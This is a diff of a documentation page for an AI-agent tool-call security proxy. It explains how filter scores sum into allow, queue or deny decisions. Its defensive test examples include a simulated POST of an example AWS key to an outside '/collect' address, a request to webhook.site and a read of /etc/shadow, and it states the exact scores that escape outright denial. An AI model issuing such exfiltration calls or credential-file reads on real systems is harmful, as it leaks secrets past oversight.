@@ -1,182 +1,141 @@
 ---
-title: "Composite scoring"
-description: "How 18 filter scores combine into one composite, and how that composite maps to a decision."
-section: "concepts"
+title: 'Composite scoring'
+description: 'The composite is a plain sum of what matched, and two strict comparisons decide allow, queue or deny.'
+section: 'concepts'
 order: 4
-tier: "community"
-version: "0.1.0"
-lastUpdated: "2026-05-14"
-editUrl: "https://github.com/grith-ai/grith-docs/edit/main/content/docs/concepts/composite-scoring.mdx"
+tier: 'community'
+version: '0.3.1'
+lastUpdated: '2026-08-24'
+editUrl: 'https://github.com/grith-ai/grith-docs/edit/main/content/docs/concepts/composite-scoring.mdx'
 ---
 
-After the [three-phase pipeline](/docs/concepts/three-phase-pipeline) runs, each of
-the 18 filters has emitted a score (positive contributes toward deny, negative toward
-allow). The scoring engine combines them into a single composite, applies the
-reputation adjustment, and routes the call.
+The composite score is the sum of the scores of the filters that matched. That is the
+whole algorithm. No weights, no normalisation, no per-filter ceiling, no maximum.
 
-## The basic combination
+Three filters can subtract: `allowlist`, `egress-policy` and `reputation` each emit
+**-1.0** when they recognise something as known-good, so a composite can be negative. A
+plain GET to `github.com` scores `0.5` from `operation-risk`, `-1.0` from `egress-policy`
+and `-1.0` from `reputation` - composite **-1.5**, allowed.
 
-Naive sum is wrong: it would let one over-eager filter dominate, and it would make
-filter weights painfully fragile to tune.
+## The three bands
 
-What grith actually does (in `grith-proxy::scoring::ScoringEngine`):
+| Composite | Decision |
+| --- | --- |
+| 3.0 or below | ALLOW |
+| above 3.0, up to and including 8.0 | QUEUE |
+| above 8.0 | DENY |
 
-1. **Cap each filter's contribution** at `reputation.ceiling_filter_threshold`
-   (default `5.0`). No single filter can push the composite past that ceiling on its
-   own.
-2. **Sum the capped contributions**. Negative scores (from routine paths, approved
-   destinations) subtract.
-3. **Apply the reputation discount**: if the trust table has observed this
-   (destination, call shape, profile) combination enough times to qualify
-   (`reputation.auto_allow_min_observations`, default `8`) and the trust score is
-   above `reputation.auto_allow_trust` (default `0.92`), subtract up to
-   `reputation.max_score_reduction` (default `4.0`) — but never below `0`.
-4. **Apply hard gates last**: if any filter returned DENY (capability filter denied
-   the call, or canary filter detected an exfil token), force-set composite to
-   `>= auto_deny_threshold`.
+Both boundaries are strict greater-than, so both boundary values fall on the less
+restrictive side. **Exactly 3.0 allows. Exactly 8.0 queues.** A call landing on 8.0 goes
+to a human, not to a denial.
 
-The result is the composite score.
+That is not trivia. A read of `/etc/shadow` lands on exactly 8.0 - `path-match` 5.0 plus
+`sensitive-path-heuristic` 3.0 - and goes in front of a human rather than being refused
+outright. So does a GET to a known-malicious host:
 
-## The decision table
+<Terminal>
+{`$ grith proxy test '{"type":"HttpRequest","method":"GET","url":"https://webhook.site/abc"}'
+Proxy Test Result
+==================================================
+  Tool call:   HttpRequest(GET https://webhook.site/abc)
+  Score:       8.0
+  Decision:    QUEUE (Critical)
+  Reason:      Score 8.0 in escalation zone
+  Eval time:   2.84ms
+  Thresholds:  allow < 3, deny > 8
+  Filters:     18 active
 
-```
-composite < proxy.auto_allow_threshold   →  ALLOW   (default <3.0)
-composite ≥ proxy.auto_deny_threshold    →  DENY    (default >8.0)
-otherwise                                →  QUEUE
-```
+  Filter Breakdown:
+    + operation-risk         0.5  [notice]  HTTP request: GET https://webhook.site/abc
+    . path-match             0.0
+    . sensitive-path-heuristic   0.0
+    . allowlist              0.0
+    . argument               0.0
+    . capability             0.0
+    . secret-scan            0.0
+    . command                0.0
+    . destructive-action     0.0
+    + egress-policy          3.5  [warning]  Unknown outbound destination from http_request: webhook.site
+    . dlp-gate               0.0
+    . canary                 0.0
+    + reputation             4.0  [critical]  Known malicious domain: webhook.site
+    . behavioural            0.0
+    . taint                  0.0
+    . session-containment    0.0
+    . rate-limit             0.0
+    . egress-rate            0.0
 
-`auto_allow_threshold` and `auto_deny_threshold` are configurable. The defaults
-(`3.0`, `8.0`) are tuned for the typical agent workload — see
-[Tuning scoring thresholds](/docs/guides/tuning-scoring-thresholds) for when to
-move them.
+  Exit code:   1 (queue (critical))`}
+</Terminal>
 
-## Fixed thresholds
+The thresholds are identical for every call. There is no cold-start widening: the first
+call of a fresh install is scored exactly like the ten-thousandth.
 
-The thresholds are the same for every call - the first call of a fresh install is
-scored exactly like the thousandth. An earlier cold-start mode that widened the
-thresholds for the first N calls was removed so that early destructive or
-exfiltrating operations are never under-scored. If a new install floods the queue,
-tune the thresholds directly or teach the
-[reputation system](/docs/concepts/adaptive-reputation) with `learn` approvals.
+## No filter can force a decision
 
-## A worked example
+A filter result carries a name, a match flag, a score, a rule id, a severity, a message
+and some metadata. There is no allow field, no deny field, no queue field. A filter
+cannot vote on the outcome; it can only contribute a number.
 
-Agent reads a project file:
+What people call a "hard deny" is always a score deliberately set above 8.0 so it clears
+the line unaided:
 
-```
-file_read /project/src/app.ts
+| Filter | Score | Fires when |
+| --- | --- | --- |
+| `capability` | 10.0 | A configured capability grant does not cover this call |
+| `canary` | 9.5 | A registered decoy secret appears in an outbound call |
+| `destructive-action` | 9.0 | A catastrophic destructive command |
 
-  filter                       contribution
-  ────────────────────────────────────────
-  operation-risk               +0.5     (read = low risk)
-  path-match                   -1.0     (project dir is allowlisted)
-  sensitive-path-heuristic      0
-  allowlist                     0
-  argument                      0
-  capability                    0
-  ────────────────────────────────────────
-  Phase 1 subtotal             -0.5
+Each denies by arithmetic. Nothing clamps them, and nothing clamps the total - which is
+how three moderate filters add up to a denial:
 
-  secret-scan                   0       (no content yet - this is a read)
-  command                       0       (not a shell call)
-  egress-policy                 0       (not a network call)
-  dlp-gate                      0
-  canary                        0
-  ────────────────────────────────────────
-  Phase 2 subtotal              0.0
+<Terminal>
+{`$ grith proxy test '{"type":"HttpRequest","method":"POST","url":"https://198.51.100.7/collect","body":"AKIAIOSFODNN7EXAMPLE"}'
+  Score:       11.0
+  Decision:    DENY
+  Reason:      HTTP POST request (carries body): https://198.51.100.7/collect; AWS access key ID detected; Secret detected in outbound arguments [aws-key]: aws-access-key
+  Thresholds:  allow < 3, deny > 8
+  Filters:     18 active
 
-  reputation                   -0.3     (project dir trusted)
-  behavioural                   0       (within baseline)
-  taint                         0       (clean read)
-  session-containment           0       (in the right zone)
-  rate-limit                    0
-  semantic                      0       (stub)
-  ────────────────────────────────────────
-  Phase 3 subtotal             -0.3
+  Filter Breakdown:
+    + operation-risk         1.0  [notice]  HTTP POST request (carries body): https://198.51.100.7/collect
+    . path-match             0.0
+    . sensitive-path-heuristic   0.0
+    . allowlist              0.0
+    . argument               0.0
+    . capability             0.0
+    + secret-scan            5.0  [critical]  AWS access key ID detected
+    . command                0.0
+    . destructive-action     0.0
+    . egress-policy          0.0
+    + dlp-gate               5.0  [error]  Secret detected in outbound arguments [aws-key]: aws-access-key
+    . canary                 0.0
 
-  Composite (pre-reputation):  -0.8
-  Reputation discount applied: -0.0     (already negative; floor at 0)
-  Composite:                    0.0   → ALLOW
-```
+  Exit code:   2 (deny)`}
+</Terminal>
 
-The same agent reads `~/.ssh/config` ten seconds later:
+`Critical`, `Error`, `Warning` and `Notice` in that breakdown are each filter's own
+severity label, not a band read off the number - `secret-scan` calls 5.0 critical where
+`dlp-gate` calls the same 5.0 an error. They change nothing about the decision.
 
-```
-file_read /home/you/.ssh/config
+## What happens after the sum
 
-  operation-risk               +0.5
-  path-match                   +1.2     (.ssh/ on the static denylist)
-  sensitive-path-heuristic     +3.5     (ssh config heuristic)
-  allowlist                     0
-  argument                      0
-  capability                    0
-  ────────────────────────────────────────
-  Phase 1 subtotal             +5.2
+Two things sit outside the pipeline and are easy to confuse with it.
 
-  (Phases 2 and 3 add nothing material)
+**The meta-rules** run once, after phase 3, and adjust the total - except `score_override`,
+which replaces it and stops the rule loop dead. `ssh-key-access` is the only override rule
+shipped.
 
-  Composite:                   +5.2   → QUEUE  (between 3.0 and 8.0)
-```
+**The learned reputation table** is applied later still, in the daemon, and **only to a
+QUEUE**. It never revisits a DENY, and it never lowers a score by degrees: it either flips
+the whole call to allow or leaves it exactly as it was. See
+[adaptive reputation](/docs/concepts/adaptive-reputation).
 
-A taint-tracked network call after that:
-
-```
-network POST https://api.example.com/upload  (body contains .env contents)
-
-  operation-risk               +1.5     (network write)
-  ...
-  secret-scan                  +4.0     (matched API key pattern)
-  egress-policy                +1.0     (unknown host)
-  dlp-gate                     +3.5     (large credential-shaped payload)
-  ...
-  taint                        +3.0     (body originated from .env read 4 calls ago)
-  reputation                    0       (no history with this host)
-
-  Composite (before ceiling):  +12.5
-  After per-filter ceilings:   +9.5   → DENY
-```
-
-(Numbers are illustrative — the exact filter weights are documented per-filter and
-in [Scoring rules](/docs/filters/scoring-rules).)
-
-## Why caps and not weights
-
-Per-filter weights would mean tuning ~17 numbers in concert. Caps mean tuning one
-number per filter (its maximum contribution), and the composite emerges. It's also
-robust to a buggy filter: a filter that fires too aggressively can still only push
-the composite up by its cap.
-
-## Hard gates: capability and canary
-
-Two filters are *not* score contributors:
-
-- [Capability enforcement](/docs/filters/06-capability-enforcement) returns DENY when
-  the active profile doesn't grant the necessary capability for the call.
-- [Canary detection](/docs/filters/11-canary-secret-detection) returns DENY when an
-  outbound payload contains a registered canary token.
-
-Both short-circuit the composite. A capability deny on a network call doesn't get
-the "you're inside the project, that's nice" discount.
-
-## Inspecting the scoring
-
-Every decision is logged with the per-filter breakdown:
-
-```
-grith audit export --format json   # records carry the per-filter breakdown
-```
-
-For interactive debugging:
-
-```
-grith proxy test '{"operation":"file_read","target":"/home/you/.ssh/config"}'
-```
-
-The exit code reflects the decision (0 allow, 1 queue, 2 deny). Useful in scripts.
+`grith proxy test` exits **0 for allow, 1 for queue, 2 for deny**, so any of this can be
+checked from a script.
 
 ## See also
 
-- [Filter overview](/docs/filters/overview) — every filter and its score range
-- [Scoring rules](/docs/filters/scoring-rules) — full math reference
+- [The three-phase pipeline](/docs/concepts/three-phase-pipeline)
+- [Meta-rules](/docs/filters/meta-rules)
 - [Tuning scoring thresholds](/docs/guides/tuning-scoring-thresholds)
-- [Adaptive reputation](/docs/concepts/adaptive-reputation) — the trust table
